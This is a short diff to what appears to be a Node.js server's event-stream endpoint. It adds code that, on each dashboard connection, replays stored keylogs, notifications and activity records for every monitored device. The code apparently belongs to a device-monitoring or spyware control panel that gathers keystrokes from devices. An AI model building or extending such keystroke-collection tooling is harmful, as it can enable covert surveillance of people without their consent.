@@ -994,6 +994,22 @@ app.get('/api/events', async (req, res) => {
     // Tell the client its own sseId so it can include it in HTTP requests
     sseSend(clientId, 'session:init', { sseClientId: clientId });
 
+    // Replay buffered data from Redis for all known devices so the dashboard
+    // sees everything that happened while it was disconnected / the user was away.
+    try {
+        const deviceIds = list.map(d => d.deviceId).filter(Boolean);
+        for (const did of deviceIds) {
+            const [keylogs, notifications, activity] = await Promise.all([
+                R.getKeylogs(did),
+                R.getNotifications(did),
+                R.getActivity(did),
+            ]);
+            if (keylogs.length)        sseSend(clientId, 'keylog:history',       { deviceId: did, entries: keylogs });
+            if (notifications.length)  sseSend(clientId, 'notification:history', { deviceId: did, entries: notifications });
+            if (activity.length)       sseSend(clientId, 'activity:history',     { deviceId: did, entries: activity });
+        }
+    } catch (e) { log('SSE', `History replay error: ${e.message}`, 'warn'); }
+
     // Keep the connection alive with a comment every 25 s
     const keepAlive = setInterval(() => {
         if (!res.writableEnded) res.write(': ka\n\n');
